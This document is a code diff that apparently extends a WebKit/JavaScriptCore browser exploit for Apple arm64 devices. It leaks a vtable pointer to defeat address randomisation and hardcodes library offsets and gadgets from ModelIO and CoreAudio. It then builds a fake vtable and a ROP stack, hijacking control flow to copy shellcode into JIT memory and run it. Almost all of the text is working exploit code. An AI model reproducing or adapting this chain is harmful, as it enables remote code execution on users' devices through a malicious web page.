@@ -773,6 +773,12 @@ let primitives = stage1;
             driver[1] = Add(addr, 0x10).asDouble();
             victim.prop = this.fakeobj(what);
         },
+	    write_non_zero: function(where, values) {
+            for (var i = 0; i < values.length; ++i) {
+                if (values[i] != 0)
+                    this.write64(where + i*8, values[i])
+            }
+        },
 
         read64: function(addr) {
             driver[1] = Add(addr, 0x10).asDouble();
@@ -931,6 +937,114 @@ var shellcodeFunc = makeJITCompiledFunction();
     // Ensure we're running on macOS by analysing the prologue
     // of the JIT function.
     //
+	
+	var wrapper = document.createElement('div');
+
+    var wrapper_addr = primitives.addrof(wrapper)
+    var el_addr = primitives.read64(Add(wrapper_addr, 0x20));
+    var vtab_addr = primitives.read64(el_addr)
+
+    // Various offsets here
+    var slide = primitives.read64(vtab_addr) - 0x189c9a808
+    var disablePrimitiveGigacage = 0x18851a7d4 + slide
+    var callbacks = 0x1b335bd28 + slide
+    var g_gigacageBasePtrs = 0x1b1d08000 + slide
+    var g_typedArrayPoisons = 0x1b335d720 + slide
+    var longjmp = 0x180b126e8 + slide
+    var dlsym = 0x18084ef90 + slide
+
+    var startOfFixedExecutableMemoryPool = primitives.read64(0x1b335d0b8 + slide)
+    var endOfFixedExecutableMemoryPool = primitives.read64(0x1b335d0c0 + slide)
+    var jitWriteSeparateHeapsFunction = primitives.read64(0x1b335d0c8 + slide)
+    var useFastPermisionsJITCopy = primtivs.read64(0x1b1d04018 + slide)
+
+    var ptr_stack_check_guard = 0x1ac3efc40 + slide
+
+    // ModelIO:0x000000018d2f6564 :
+    //   ldr x8, [sp, #0x28]
+    //   ldr x0, [x8, #0x18]
+    //   ldp x29, x30, [sp, #0x50]
+    //   add sp, sp, #0x60
+    //   ret
+    var pop_x8 = 0x18d2f6564 + slide
+
+    // CoreAudio:0x000000018409ddbc
+    //   ldr x2, [sp, #8]
+    //   mov x0, x2
+    //   ldp x29, x30, [sp, #0x10]
+    //   add sp, sp, #0x20
+    //   ret
+    var pop_x2 = 0x18409ddbc + slide
+
+    // see jitcode.s
+    var linkcode_gadget = 0x187bd18c8 + slide
+
+    //print('base @ ' + hex(base)
+        //+ '\ndisablePrimitiveGigacage @ ' + hex(disablePrimitiveGigacage)
+        //+ '\ng_gigacageBasePtrs @ ' + hex(g_gigacageBasePtrs)
+        //+ '\ng_typedArrayPoisons @ ' + hex(g_typedArrayPoisons)
+        //+ '\nstartOfFixedExecutableMemoryPool @ ' + hex(startOfFixedExecutableMemoryPool)
+        //+ '\nendOfFixedExecutableMemoryPool @ ' + hex(endOfFixedExecutableMemoryPool)
+        //+ '\njitWriteSeparateHeapsFunction @ ' + hex(jitWriteSeparateHeapsFunction)
+        //+ '\nuseFastPermisionsJITCopy @ ' + hex(useFastPermisionsJITCopy)
+        //)
+
+    if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
+        // Probably an older phone, should be even easier
+        fail(3)
+    }
+    var callback_vector = primitives.read64(callbacks)
+
+    var poison = primitives.read64(g_typedArrayPoisons + 6*8)
+    var buffer_addr = xor(primitives.read64(primitives.addrof(u32_buffer) + 0x18), poison)
+
+    var shellcode_src = buffer_addr + 0x4000
+    var shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000
+    if (shellcode_dst < startOfFixedExecutableMemoryPool) {
+        fail(4)
+    }
+    primitives.write64(shellcode_src + 4, dlsym)
+
+    var fake_stack = [
+        0,
+        shellcode_length,  // x2
+        0,
+
+        pop_x8,
+
+        0, 0, 0, 0, 0,
+        shellcode_dst, // x8
+        0, 0, 0, 0,
+        stage2.read64(ptr_stack_check_guard) + 0x58,
+
+        linkcode_gadget,
+        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+
+        shellcode_dst,
+    ]
+
+    // Set up fake vtable at offset 0
+    u32_buffer[0] = longjmp % BASE32
+    u32_buffer[1] = longjmp / BASE32
+
+    // Set up fake stack at offset 0x2000
+    for (var i = 0; i < fake_stack.length; ++i) {
+        u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32
+        u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32
+    }
+
+    primitives.write_non_zero(el_addr, [
+        buffer_addr, // fake vtable
+        0,
+        shellcode_src, // x21
+        0, 0, 0, 0, 0, 0, 0,
+        0, // fp
+
+        pop_x2, // lr
+        0,
+        buffer_addr + 0x2000, // sp
+    ])
 
     
 }
